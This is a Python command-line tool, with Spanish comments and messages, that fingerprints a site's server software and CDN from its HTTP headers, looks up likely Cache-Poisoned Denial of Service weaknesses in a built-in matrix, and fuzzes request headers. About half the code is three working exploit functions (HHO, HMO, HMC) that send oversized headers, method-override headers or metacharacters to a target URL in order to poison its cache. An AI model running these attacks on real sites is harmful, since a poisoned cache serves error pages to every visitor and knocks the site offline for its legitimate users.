import requests
import argparse
import sys
import re
from colorama import Fore, Style
from collections import defaultdict

# Extraido de https://cpdos.org/#overview
TECH_MATRIX = {
    'ASP.NET': {
        'Varnish': {'HHO': True, 'HMC': False, 'HMO': False},
        'Akamai': {'HHO': True, 'HMC': False, 'HMO': False},
        'CDN77': {'HHO': True, 'HMC': False, 'HMO': False},
        'Cloudflare': {'HHO': True, 'HMC': False, 'HMO': False},
        'CloudFront': {'HHO': True, 'HMC': True, 'HMO': False},
        'Fastly': {'HHO': True, 'HMC': False, 'HMO': False}
    },
    
    "IIS": {
        "Varnish": {"HHO": True, "HMC": False, "HMO": False},
        "Akamai": {"HHO": True, "HMC": False, "HMO": False},
        "CDN77": {"HHO": True, "HMC": False, "HMO": False},
        "Cloudflare": {"HHO": True, "HMC": False, "HMO": False},
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False},
        "Fastly": {"HHO": True, "HMC": False, "HMO": False}
    },
    "Apache HTTPD + (ModSecurity)": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Nginx + (ModSecurity)": {
        "CloudFront": {"HHO": True, "HMC": False, "HMO": False}
    },
    "Tomcat": {
        "CloudFront": {"HHO": True, "HMC": False, "HMO": False}
    },
    "Varnish": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Amazon S3": {
        "CloudFront": {"HHO": True, "HMC": False, "HMO": False}
    },
    "Github Pages": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Gitlab Pages": {
        "CloudFront": {"HHO": False, "HMC": True, "HMO": False}
    },
    "Heroku": {
        "CloudFront": {"HHO": True, "HMC": False, "HMO": False}
    },
    
    "Beego": {
        "CloudFront": {"HHO": False, "HMC": True, "HMO": False}
    },
    "Django": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Express.js": {
        "CloudFront": {"HHO": False, "HMC": True, "HMO": False}
    },
    "Flask": {
        "Akamai": {"HHO": False, "HMC": False, "HMO": True},
        "CloudFront": {"HHO": True, "HMC": True, "HMO": True}
    },
    "Gin": {
        "CloudFront": {"HHO": False, "HMC": True, "HMO": False}
    },
    "Laravel": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Meteor.js": {
        "CloudFront": {"HHO": False, "HMC": True, "HMO": False}
    },
    "Play 1": {
        "Varnish": {"HHO": False, "HMC": False, "HMO": True},
        "Akamai": {"HHO": False, "HMC": False, "HMO": True},
        "CDN77": {"HHO": False, "HMC": False, "HMO": True},
        "Cloudflare": {"HHO": False, "HMC": False, "HMO": True},
        "CloudFront": {"HHO": True, "HMC": False, "HMO": True},
        "Fastly": {"HHO": False, "HMC": False, "HMO": True}
    },
    "Play 2": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Rails": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    },
    "Spring Boot": {
        "CloudFront": {"HHO": True, "HMC": False, "HMO": False}
    },
    "Symfony": {
        "CloudFront": {"HHO": True, "HMC": True, "HMO": False}
    }

}

def cargar_wordlist(ruta_archivo):
    """Carga un archivo de wordlist con formato 'encabezado:valor'."""
    try:
        with open(ruta_archivo, 'r') as f:
            return dict(line.strip().split(':', 1) for line in f if ':' in line)

    except FileNotFoundError:
        print(f"[X] Error: Archivo '{ruta_archivo}' no encontrado.")
        return {}
           
def analizar_encabezados_y_recomendar(url,headers_personalizados=None):
    try:
        response = requests.get(url, headers=headers_personalizados, verify=False, timeout=10)
        encabezados = response.headers

        print(f"\n[A] Analizando encabezados de: {url}")
        print(f"[{Fore.GREEN}✓{Style.RESET_ALL}] Código de estado: {response.status_code}")

        
        print("\n=== Encabezados HTTP ===")
        for k, v in encabezados.items():
            #print(f"{k}: {v}")
            if k.lower() == 'server':
                print(f"{Fore.GREEN}{k}: {Fore.CYAN}{v}{Style.RESET_ALL}")
            elif k.lower().startswith('x-'):
                print(f"{Fore.MAGENTA}{k}: {Fore.WHITE}{v}{Style.RESET_ALL}")
            elif 'cookie' in k.lower():
                print(f"{Fore.RED}{k}: {Fore.YELLOW}{v}{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}{k}: {Fore.WHITE}{v}{Style.RESET_ALL}")

        
        print(f"\n=== {Fore.YELLOW}Encabezados personalizados (X-*){Style.RESET_ALL} ===")
        x_headers = [h for h in encabezados if h.startswith(('X-', 'x-'))]
        if x_headers:
            for h in x_headers:
                print(f"{Fore.BLUE}{h}{Style.RESET_ALL}: {encabezados[h]}")
        else:
            print("No se encontraron encabezados personalizados.")

        
        print(f"\n=== {Fore.YELLOW} Análisis del encabezado 'Vary'{Style.RESET_ALL} ===")
        if "Vary" in encabezados:
            print(f"Vary:{Fore.BLUE} {encabezados['Vary']}{Style.RESET_ALL}")
            if "X-Forwarded-Host" in encabezados["Vary"]:
                print("[W] Posible vulnerabilidad: 'Vary' incluye 'X-Forwarded-Host' (riesgo de cache poisoning).")
        else:
            print("No se encontró el encabezado 'Vary'.")
            
        return response
    except KeyboardInterrupt:
        print("\n[STOP] Ejecución interrumpida por el usuario (Ctrl+C).")
        sys.exit(0)
    
    except Exception as e:
        print(f"[X] Error: {e}")

def fuzzing_encabezados(url,fullFuzzing, ruteWordlist, response):
        
    modo="top10"
    common_headers_to_fuzz = {
        "Content-Type":"text/html; charset=UTF-8", 
        "X-Original-URL":"3421", 
        "Date":"Wed, 22 May 2025 14:00:00 GMT",
        "Server":"nginx/1.18.0 (Ubuntu)",
        "Connection":"keep-alive",
        "Cache-Control":"max-age=3600",
        "Last-Modified":"Wed, 22 May 2025 12:00:00 GMT",
        "ETag":"abc123def",
        "Accept-Ranges":"bytes",
        "Content-Encoding":"gzip"
    }
    if ruteWordlist != None:
        common_headers_to_fuzz=cargar_wordlist(ruta_archivo=ruteWordlist)
        modo="Diccionario propio"
    elif fullFuzzing:
        common_headers_to_fuzz=cargar_wordlist(ruta_archivo="Fuzz_headers.txt")
        modo="Full Fuzzing"
        
    print(f"\n==={Fore.YELLOW} Fuzzing de encabezados ({modo}) {Style.RESET_ALL}===")
    for header in common_headers_to_fuzz:
        try:
            
            test_response = requests.get(url, headers={header: "fuzz_value"}, verify=True, timeout=5)
            if test_response.status_code != response.status_code:
                print(f" El encabezado '{Fore.BLUE}{header}{Style.RESET_ALL}' afecta la respuesta (Código: {test_response.status_code}).")
        except KeyboardInterrupt:
                print("\n[STOP] Fuzzing interrumpido por el usuario (Ctrl+C).")
                
                sys.exit(0)  # Salir con código 0 (sin error)
                
        except:
            pass

    



# tabla sacada de https://cpdos.org/#overview


def detectar_cdn(headers):
    cdn_headers = { 
        "Akamai": ["akamai-", "x-akamai"],
        "CDN77": ["cdn77-", "x-cdn","X-77-POP","X-77-Cache","X-77-NZT-Ray"],
        "Cloudflare": ["cf-ray", "cf-cache-status", "server:cloudflare","Cf-Connecting-IP","CF-EW-Via","CF-Pseudo-IPv4","CF-IPCountry","CDN-Loop","CF-Worker"],
        "CloudFront": ["x-amz-cf-","server:cloudfront", "via:1.1 cloudfront","CloudFront-Viewer-Address","CloudFront-Viewer-Address","CloudFront-Viewer-Country-Region","CloudFront-Viewer-Header-Order"],
        "Fastly": ["fastly-cachetype", "x-fastly-request-id","fastly-"],
        "Envoy":["x-envoy-","x-datadog-","server:envoy"],
        "Varnish": ["via: 1.1 varnish"],
    }

    coincidencias_cdn = ""
    lower_headers = {k.lower(): v.lower() if isinstance(v, str) else v 
                    for k, v in headers.items()}
    for cdn, patrones in cdn_headers.items():
        for patron in patrones:
            try:
                if ":" in patron:  # Patrón clave:valor
                    k_patron, v_patron = [p.strip().lower() for p in patron.split(":", 1)]
                    
                    # Buscar en headers
                    if (k_patron in lower_headers and 
                        (v_patron == lower_headers[k_patron] or 
                         (isinstance(lower_headers[k_patron], str) and 
                          v_patron in lower_headers[k_patron]))):
                        return cdn
                
                else:  # Patrón simple (buscar en claves)
                    patron = patron.lower()
                    # Buscar en headers
                    if patron in lower_headers:
                        return cdn
                    
                        
            except (AttributeError, KeyError):
                continue

    return coincidencias_cdn if coincidencias_cdn else "No se detectó CDN conocido"

def identificar_tecnologia(headers, cookies):
    firmas = {
        "Apache HTTPD + (ModSecurity)": ["server:apache"],
        "Nginx + (ModSecurity)": ["server:nginx"],
        "IIS": ["server:microsoft-iis"],
        "Tomcat": ["server:apache-coyote"],
        "Amazon S3": ["server:amazons3", "x-amz-request-id"],
        "ASP.NET": ["x-powered-by:asp.net", "server:kestrel"],
        "BeeGo": ["server:beegoserver"],
        "Django": ["server:gunicorn","server:WSGIServer/0.2", "server:CPython/3.10.6"],
        "Express.js": ["x-powered-by:express"],
        "Flask": ["server:werkzeug"],
        "Gin": ["server:gin"],
        "Laravel": ["laravel_session", "x-powered-by:php"],
        "Meteor.js": ["server:meteor"],
        "Play 1": ["x-powered-by:play"],
        "Rails": ["x-runtime", "x-powered-by:phusion passenger"],
        "Spring Boot": ["x-application-context", "server:jetty", "server:apache tomcat"],
        "Symfony": ["x-debug-token", "x-powered-by:php"],
        "Varnish": ["via:1.1 varnish","server:varnish"],
        "Google Cloud Storage": ["server:uploadserver", "x-goog-"],
        "Github Pages": ["server:github.com"],
        "Gitlab Pages": ["server:gitlab"],
        "Heroku": ["via:1.1 vegur"],
    }


    coincidencia = ""
    lower_headers = {k.lower(): v.lower() if isinstance(v, str) else v 
                    for k, v in headers.items()}
    for tecnologia, patrones in firmas.items():
        for patron in patrones:
            try:
                if ":" in patron:  # Patrón clave:valor
                    k_patron, v_patron = [p.strip().lower() for p in patron.split(":", 1)]
                    # Buscar en headers
                    if (k_patron in lower_headers and 
                        (v_patron == lower_headers[k_patron] or 
                         (isinstance(lower_headers[k_patron], str) and 
                          v_patron in lower_headers[k_patron]))):
                        return tecnologia
                
                else:  # Patrón simple (buscar en claves)
                    patron = patron.lower()
                    # Buscar en headers
                    if patron in lower_headers:
                        return tecnologia
                    # Buscar en cookies
                    if patron in lower_headers['cookie']:
                        return tecnologia
                        
            except (AttributeError, KeyError):
                continue

    return coincidencia if coincidencia else "No se detectó tecnología conocida"



def detectar_tecnologias(url):
    """Detecta la tecnología del servidor y caché/CDN"""
    try:
        response = requests.get(url, timeout=5, verify=False)
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        cookies = response.cookies.get_dict()

        http_impl = identificar_tecnologia(headers=headers,cookies=cookies)
        cache_tech = detectar_cdn(headers=headers)
        return http_impl, cache_tech, headers
        
    except Exception as e:
        print(f"Error detecting technologies: {e}")
        return None, None, None

def revisar_cpdos_vulnerabilidades(http_impl, cache_tech):
    """Revisa vulnerabilidades CPDoS basado en la matriz"""
    if not http_impl or not cache_tech:
        return None
    
    # Buscar en la matriz principal
    for impl, cache_dict in TECH_MATRIX.items():
        if impl == http_impl:
            for cache, vulns in cache_dict.items():
                if cache == cache_tech:
                    return vulns
    
    # Si no se encuentra combinación exacta, buscar por implementación
    for impl, cache_dict in TECH_MATRIX.items():
        if impl.split(' +')[0] == http_impl.split(' +')[0]:
            for cache, vulns in cache_dict.items():
                if cache == cache_tech:
                    return vulns
    
    return {'HHO': False, 'HMC': False, 'HMO': False}



def analizar_cpdos(url):
    """Analiza URL para vulnerabilidades CPDoS con salida a color."""
    http_impl, cache_tech, headers = detectar_tecnologias(url)
    
    print(f"\n{Fore.YELLOW}🔍 Análisis de CPDoS para: {Fore.CYAN}{url}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'='*50}{Style.RESET_ALL}")
    
    if not http_impl:
        print(f"{Fore.RED}[✗] No se pudo determinar la implementación HTTP{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Implementación HTTP detectada: {Fore.GREEN}{http_impl}{Style.RESET_ALL}")
    
    if cache_tech:
        print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Tecnología de caché/CDN detectada: {Fore.MAGENTA}{cache_tech}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[i]{Style.RESET_ALL} No se detectó tecnología de caché/CDN")
    
    vulns = revisar_cpdos_vulnerabilidades(http_impl, cache_tech)
    
    print(f"\n{Fore.BLUE} Vulnerabilidades CPDoS potenciales:{Style.RESET_ALL}")
    print(f"HHO (HTTP Header Oversize): {Fore.GREEN if vulns['HHO'] else Fore.RED}[{'✓' if vulns['HHO'] else '✗'}]{Style.RESET_ALL}")
    print(f"HMC (HTTP Meta Character): {Fore.GREEN if vulns['HMC'] else Fore.RED}[{'✓' if vulns['HMC'] else '✗'}]{Style.RESET_ALL}")
    print(f"HMO (HTTP Method Override): {Fore.GREEN if vulns['HMO'] else Fore.RED}[{'✓' if vulns['HMO'] else '✗'}]{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN} Cabeceras relevantes:{Style.RESET_ALL}")
    for h in ['Server', 'X-Powered-By', 'Via', 'X-Cache', 'CF-Ray', 'X-Akamai']:
        if h in headers:
            print(f"{Fore.MAGENTA}{h}: {Fore.WHITE}{headers[h]}{Style.RESET_ALL}")
    
import http.client
import urllib.parse

def HHO_Exploit(target_url: str, payload_size: int, header_to_exploit: str):
    
    try:
        # Parsear la URL para obtener host, puerto y ruta
        parsed_url = urllib.parse.urlparse(target_url)

        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)
        path = parsed_url.path
        if not path: # Asegura que la ruta no esté vacía
            path = "/"
        if parsed_url.query: # Añade la query string si existe
            path += "?" + parsed_url.query

        scheme = parsed_url.scheme

        print(f"\n--- Iniciando ataque HHO a {target_url} ---")
        print(f"Host: {host}, Puerto: {port}, Ruta: {path}")
        print(f"Tamaño del payload: {payload_size} caracteres")
        print(f"Cabecera a explotar: '{header_to_exploit}'")

        big_header_value = "A" * payload_size

        # Diccionario de encabezados
        headers = {
            header_to_exploit: big_header_value
        }

        # Conectar al servidor (usando HTTPSConnection si el esquema es https)
        if scheme == 'https':
            conn = http.client.HTTPSConnection(host, port)
        else:
            conn = http.client.HTTPConnection(host, port)

        # Realizar la petición GET
        conn.request("GET", path, headers=headers)

        # Obtener y procesar la respuesta
        res = conn.getresponse()
        print("\n--- Respuesta del servidor ---")
        print(f"Código de estado: {res.status}")
        print(f"Razón: {res.reason}")

        # Imprimir cabeceras de respuesta para ver X-Cache, X-Varnish, etc.
        print("\nCabeceras de respuesta:")
        for header, value in res.getheaders():
            print(f"  {header}: {value}")

        body = res.read().decode("utf-8", errors="replace")
        print("\nContenido de la respuesta:")
        print(body)

    except http.client.HTTPException as e:
        print(f"\n¡Error HTTP al conectar o enviar la solicitud: {e}")
    except ConnectionRefusedError:
        print(f"\n¡Error: Conexión rechazada! Asegúrate de que Varnish está corriendo en {host}:{port}.")
    except ValueError as e:
        print(f"\n¡Error de URL o puerto: {e}. Asegúrate de que la URL es válida.")
    except Exception as e:
        print(f"\n¡Ha ocurrido un error inesperado: {e}")
    finally:
        # Asegurar que la conexión se cierra
        if 'conn' in locals() and conn:
            conn.close()
            print("\n--- Conexión cerrada ---")
            
            
def HMO_Exploit(target_url: str, header_to_exploit: str, method_to_exploit:str):
    
    try:
        # Parsear la URL para obtener host, puerto y ruta
        parsed_url = urllib.parse.urlparse(target_url)

        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)
        path = parsed_url.path
        if not path: # Asegura que la ruta no esté vacía
            path = "/"
        if parsed_url.query: # Añade la query string si existe
            path += "?" + parsed_url.query

        scheme = parsed_url.scheme

        print(f"\n--- Iniciando ataque HMO a {target_url} ---")
        print(f"Host: {host}, Puerto: {port}, Ruta: {path}")
        print(f"Method de explotacion: {method_to_exploit}")
        print(f"Cabecera a explotar: '{header_to_exploit}'")

        # Diccionario de encabezados
        headers = {
            header_to_exploit: method_to_exploit
        }

        # Conectar al servidor (usando HTTPSConnection si el esquema es https)
        if scheme == 'https':
            conn = http.client.HTTPSConnection(host, port)
        else:
            conn = http.client.HTTPConnection(host, port)

        # Realizar la petición GET
        conn.request("GET", path, headers=headers)

        # Obtener y procesar la respuesta
        res = conn.getresponse()
        print("\n--- Respuesta del servidor ---")
        print(f"Código de estado: {res.status}")
        print(f"Razón: {res.reason}")

        # Imprimir cabeceras de respuesta para ver X-Cache, X-Varnish, etc.
        print("\nCabeceras de respuesta:")
        for header, value in res.getheaders():
            print(f"  {header}: {value}")

        body = res.read().decode("utf-8", errors="replace")
        print("\nContenido de la respuesta:")
        print(body)

    except http.client.HTTPException as e:
        print(f"\n¡Error HTTP al conectar o enviar la solicitud: {e}")
    except ConnectionRefusedError:
        print(f"\n¡Error: Conexión rechazada! Asegúrate de que Varnish está corriendo en {host}:{port}.")
    except ValueError as e:
        print(f"\n¡Error de URL o puerto: {e}. Asegúrate de que la URL es válida.")
    except Exception as e:
        print(f"\n¡Ha ocurrido un error inesperado: {e}")
    finally:
        # Asegurar que la conexión se cierra
        if 'conn' in locals() and conn:
            conn.close()
            print("\n--- Conexión cerrada ---")

def HMC_Exploit(target_url: str, header_to_exploit: str, metacharacter:str):
    
    try:
        # Parsear la URL para obtener host, puerto y ruta
        parsed_url = urllib.parse.urlparse(target_url)

        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)
        path = parsed_url.path
        if not path: # Asegura que la ruta no esté vacía
            path = "/"
        if parsed_url.query: # Añade la query string si existe
            path += "?" + parsed_url.query

        scheme = parsed_url.scheme

        print(f"\n--- Iniciando ataque HMC a {target_url} ---")
        print(f"Host: {host}, Puerto: {port}, Ruta: {path}")
        print(f"Metacarter para explotar: {metacharacter}")
        print(f"Cabecera a explotar: '{header_to_exploit}'")

        # Diccionario de encabezados
        headers = {
            header_to_exploit: metacharacter
        }

        # Conectar al servidor (usando HTTPSConnection si el esquema es https)
        if scheme == 'https':
            conn = http.client.HTTPSConnection(host, port)
        else:
            conn = http.client.HTTPConnection(host, port)

        # Realizar la petición GET
        conn.request("GET", path, headers=headers)

        # Obtener y procesar la respuesta
        res = conn.getresponse()
        print("\n--- Respuesta del servidor ---")
        print(f"Código de estado: {res.status}")
        print(f"Razón: {res.reason}")

        # Imprimir cabeceras de respuesta para ver X-Cache, X-Varnish, etc.
        print("\nCabeceras de respuesta:")
        for header, value in res.getheaders():
            print(f"  {header}: {value}")

        body = res.read().decode("utf-8", errors="replace")
        print("\nContenido de la respuesta:")
        print(body)

    except http.client.HTTPException as e:
        print(f"\n¡Error HTTP al conectar o enviar la solicitud: {e}")
    except ConnectionRefusedError:
        print(f"\n¡Error: Conexión rechazada! Asegúrate de que Varnish está corriendo en {host}:{port}.")
    except ValueError as e:
        print(f"\n¡Error de URL o puerto: {e}. Asegúrate de que la URL es válida.")
    except Exception as e:
        print(f"\n¡Ha ocurrido un error inesperado: {e}")
    finally:
        # Asegurar que la conexión se cierra
        if 'conn' in locals() and conn:
            conn.close()
            print("\n--- Conexión cerrada ---")

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Analizador avanzado de encabezados HTTP")
        parser.add_argument("-u", "--url", help="URL a analizar", required=True)
        parser.add_argument("-s", "--scan", help="modo de escaner",action="store_true")
        parser.add_argument("-H", "--header", help="Encabezado personalizado (ej: 'X-Forwarded-Host: ejemplo.com')", action="append")
        parser.add_argument("-FF", "--fullFuzzing",help="Realizar Fuzzing con todos los encabezados (por defecto 10)",action="store_true")
        parser.add_argument("-w", "--wordlist", help="Ruta a archivo de wordlist (formato 'encabezado:valor')")
        parser.add_argument("-CP", "--cachePoisoned", help="Analisis de Cache Poising",action="store_true")
        parser.add_argument("-eHHO", "--exploitHHO", help="Explotacion de HHO pasar el tamano de la carga")
        parser.add_argument("-eHMO", "--exploitHMO", help="Explotacion de HMO pasar la cabecera y el metodo por -H",action="store_true")
        parser.add_argument("-eHMC", "--exploitHMC", help="Explotacion de HMC pasar el valor del metacaracter 'x\\x99' ()")
        
        args = parser.parse_args()

        custom_headers = {}
        if args.header:
            for h in args.header:
                key, value = h.split(":", 1)
                custom_headers[key.strip()] = value.strip()

        
        
        if not (args.exploitHHO == None) : 
            if len(custom_headers) ==0: print(f"\n [STOP] Para este modo se necesita que introduca el parametro -H")
            else: HHO_Exploit(target_url=args.url,payload_size= int(args.exploitHHO),header_to_exploit=list(custom_headers.keys())[0])
            
        if args.exploitHMO:
            if len(custom_headers) ==0: print(f"\n [STOP] Para este modo se necesita que introduca el parametro -H")
            else: 
                first_value=list(custom_headers.keys())[0]
                HMO_Exploit(target_url=args.url,header_to_exploit=first_value,method_to_exploit=custom_headers[first_value])
        
        if not (args.exploitHMC == None) : 
            if len(custom_headers) ==0: print(f"\n [STOP] Para este modo se necesita que introduca el parametro -H")
            else: HMC_Exploit(target_url=args.url,header_to_exploit=list(custom_headers.keys())[0],metacharacter= args.exploitHMC.encode('latin-1').decode('unicode_escape'))
          
        if args.cachePoisoned : analizar_cpdos(args.url)
        if args.scan: 
            response= analizar_encabezados_y_recomendar(args.url, custom_headers)
            fuzzing_encabezados(args.url,args.fullFuzzing,args.wordlist,response)
        
        
    except KeyboardInterrupt:
        print("\n[STOP] Programa detenido por el usuario (Ctrl+C).")
        sys.exit(0)
        
